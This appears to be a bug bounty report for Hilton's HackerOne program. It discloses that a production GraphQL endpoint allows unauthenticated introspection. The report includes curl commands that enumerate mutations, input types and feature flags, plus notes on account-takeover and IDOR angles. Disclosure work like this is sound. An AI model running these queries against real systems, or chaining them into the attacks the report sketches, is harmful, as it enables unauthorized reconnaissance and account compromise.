# HT-004: GraphQL Introspection Enabled in Production — Full Schema Disclosure

**Program:** Hilton HackerOne  
**Asset:** `hilton.com` (Tier A)  
**Severity:** High  
**CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)  
**CWE:** CWE-200 — Exposure of Sensitive Information to an Unauthorized Actor  
**Status:** Ready to submit

---

## Summary

The Hilton production GraphQL API at `https://www.hilton.com/graphql/customer` has **introspection enabled without any authentication**. This exposes the complete API schema including:

- **103 mutations** — including account creation, account merging, points redemption, name changes, payment method management, and check-in operations
- **118 queries** — including member profile data, reservation data, travel documents, loyalty points
- **All input and output type schemas** — enabling complete API reconstruction
- **Internal service names** in error messages (`dx-guests-gql`, `dx-gql-prd`)
- **Production feature flags** queryable without authentication

This allows any unauthenticated attacker to:
1. Map the complete Hilton Honors member management API
2. Identify sensitive mutation operations for targeted attacks
3. Understand internal service architecture from error contexts
4. Query production feature toggle states

---

## Proof of Concept

### Step 1: Full schema introspection (unauthenticated)

```bash
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{"query":"{__schema{types{name kind}}}"}'
# HTTP 200 — 27,213 bytes of schema data returned
```

### Step 2: Mutations enumeration

```bash
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'
```

**Response — 103 mutations including:**
```
createGuest(autoLogin, input, language, recaptchaInput)          -- Account registration
createGuest2FA(deliveryId, deliveryMethod, guestId, ...)         -- 2FA management
createGuestCombineAccounts(input)                                  -- Account merging (ATO vector)
createGuestEmail(guestId, input, language, mfaInput, totp)       -- Email modification
createGuestNameChange(guestId, input, language)                   -- Name change
createGuestPaymentMethod(guestId, input, language, mfaInput)     -- Payment addition
createGuestPhone(guestId, input, language, mfaInput, totp)       -- Phone modification
createGuestPointsRedemption(guestId, input, mfaInput)            -- Points redemption
createGuestPromoRegistration(guestId, promotionCode)             -- Promo registration
createGuestTravelDoc(guestId, input, language)                   -- Travel document
createStayCheckin(checkin, guestId, guestUpdate, language, ...)  -- Hotel check-in
createProgramAccount(guestId, input, language, mfaInput)         -- Corporate program
createDKey(dkey, guestId, language, stayId)                      -- Digital key
deleteGuest2FA(deliveryId, deliveryMethod, guestId, ...)         -- Delete 2FA
updateGuest(guestId, input, language, mfaInput)                  -- Profile update
[+87 more...]
```

### Step 3: Complete type schema for account registration

```bash
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{"query":"{ __type(name: \"EnrollInput\") { inputFields { name type { name kind } } } }"}'
```

**Response:**
```json
{
  "EnrollInput": {
    "fields": [
      "requiredConsent",
      "address",      // EnrollAddressInput NON_NULL
      "email",        // EnrollEmailInput
      "enrollSourceCode",
      "name",         // EnrollNameInput NON_NULL
      "password",
      "phone",        // EnrollPhoneInput
      "preferredLanguage",  // NON_NULL
      "privacyRequested",   // NON_NULL
      "propCode",
      "subscriptions",      // EnrollSubscriptionsInput
      "username"
    ]
  }
}
```

### Step 4: Production feature flags (unauthenticated)

```bash
curl -s "https://www.hilton.com/graphql/customer" \
  -X POST -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 ... HackerOne" \
  -d '{"operationName":"featureToggles","query":"query featureToggles($flags: [String]!) { featureToggles(names: $flags) { id: name name enabled } }","variables":{"flags":["enablePartnerOAuth","enableHonorsTierRefresh","NHCGUEST-7159","NHCGUEST-8414"]}}'
```

**Response:**
```json
{
  "featureToggles": [
    {"name": "enablePartnerOAuth", "enabled": false},
    {"name": "enableHonorsTierRefresh", "enabled": true},
    {"name": "NHCGUEST-7159", "enabled": false},
    {"name": "NHCGUEST-8414", "enabled": false}
  ]
}
```

### Step 5: Internal service name in error context

When querying the authenticated `guest` operation with valid schema, error response reveals:
```json
{
  "errors": [{
    "message": "Unauthorized",
    "context": "dx-guests-gql",      <-- internal microservice name
    "extensions": {
      "code": "401",
      "response": {
        "body": {"fault": {"code": 900901, "description": "Invalid access token."}}
      }
    }
  }]
}
```

Server header also reveals: `x-pod: dx-gql-prd`

---

## Schema Exposed — Member Data Structure

Complete schema of the `GuestHHonorsMembership` object (obtained unauthenticated):

```
GuestHHonorsMembership (44 fields):
  hhonorsNumber: String          — Honors membership number
  status: GuestMemberStatus      — Account status
  enrollmentDate: String         — When member joined
  enrollSourceCode: String       — Enrollment source channel
  isTeamMember: Boolean          — Hilton employee flag
  isHGVMax: Boolean              — HGV Max membership flag
  isFamilyAndFriends: Boolean    — F&F program flag
  survivorHhonorsNumber: String  — Post-merge account number
  survivorId: BigInt             — Post-merge account ID
  virtualCard: GuestHHonorsVirtualCard
  smartCoupons: GuestHHonorsSmartCoupons
  promotions: GuestHHonorsPromotions
  summary: GuestHHonorsSummary   — Points, tier, etc.
  [+30 more fields...]
```

---

## Impact

1. **API reconnaissance**: Complete mutation and query catalog allows targeted fuzzing of sensitive operations without guessing endpoint names or parameters.

2. **Attack vector identification**: Knowing that `createGuestCombineAccounts` exists (and that `createGuestEmail` takes a `guestId` + `mfaInput`) enables focused testing of account takeover chains.

3. **Schema-assisted IDOR testing**: With the complete type schema, IDOR attacks on `guestId` parameters in authenticated contexts can be performed with minimal trial-and-error.

4. **Internal architecture exposure**: `dx-guests-gql` microservice name, `x-pod: dx-gql-prd` server name, and the `hltclientmessageid` format (`{uuid}-{tracking_id}`) reveal internal service topology.

5. **Feature flag intelligence**: Knowing `enablePartnerOAuth: false` confirms which integrations are disabled; an attacker monitoring this endpoint over time can detect when new features are enabled.

---

## Recommendations

1. **Disable GraphQL introspection in production**: Configure Apollo/GraphQL server to disable `__schema` and `__type` introspection in production environment.
2. **Rate-limit introspection queries**: If introspection is needed for approved developers, require an API key or restrict to internal IPs.
3. **Remove service context from error messages**: Don't expose `dx-guests-gql` or internal fault codes in client-facing errors.
4. **Restrict feature flag queries**: `featureToggles` query should require authentication or be removed from the public schema.

---

## References
- GraphQL Foundation: https://graphql.org/learn/introspection/
- OWASP API Security A09:2023 — Improper Inventory Management
- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
